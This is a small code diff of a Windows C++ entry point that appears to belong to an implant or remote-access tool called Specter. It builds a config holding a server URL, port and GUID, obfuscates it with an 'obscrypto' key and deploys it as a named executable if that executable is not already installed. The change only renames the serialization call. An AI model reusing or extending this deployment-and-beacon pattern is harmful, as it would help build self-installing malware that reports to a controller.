@@ -33,7 +33,7 @@ int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
 	InitialConfig initial_config(std::move(server_url), std::move(server_port), std::move(guid));
 
 	const std::wstring filename = name + L".exe";
-	SpecterBasicDeployment deployement(std::move(name), filename, StrUtils::Widen(initial_config.ToObscryptoB64(obscrypto_key)));
+	SpecterBasicDeployment deployement(std::move(name), filename, StrUtils::Widen(initial_config.Serialize(obscrypto_key)));
 
 	if (!deployement.IsInstalled())
 	{
